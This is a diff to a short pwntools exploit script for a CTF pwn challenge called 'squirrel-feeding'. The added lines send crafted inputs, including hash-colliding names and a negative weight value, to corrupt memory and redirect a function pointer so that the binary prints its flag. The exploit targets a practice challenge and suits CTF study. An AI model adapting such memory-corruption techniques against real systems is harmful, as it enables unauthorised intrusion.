@@ -2,7 +2,7 @@
 from pwn import *
 context.log_level='debug'
 context.arch='amd64'
-#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
 p=process('./challenge')
 # p=remote("squirrel-feeding.wolvctf.io",1337)
 ru 		= lambda a: 	p.readuntil(a)
@@ -11,10 +11,19 @@ sla 	= lambda a,b: 	p.sendlineafter(a,b)
 sa 		= lambda a,b: 	p.sendafter(a,b)
 sl		= lambda a: 	p.sendline(a)
 s 		= lambda a: 	p.send(a)
-gdb.attach(p)
 
 # Change map's *data point to flag_map's local address
 # overwrite get_max_weight with print
+for i in range(4):
+    sla("> ", "1")
+    sla(": ", "1"+"2"*i) # (49 + 50*i) % 10 = 9
+    sla(": ", "1")
+
+# gdb.attach(p)
+
+sla("> ", "1")
+sla(": ", "1"+"2222")
+sla(": ", "-1197") # 0x4ae-1
 
 
 p.interactive()
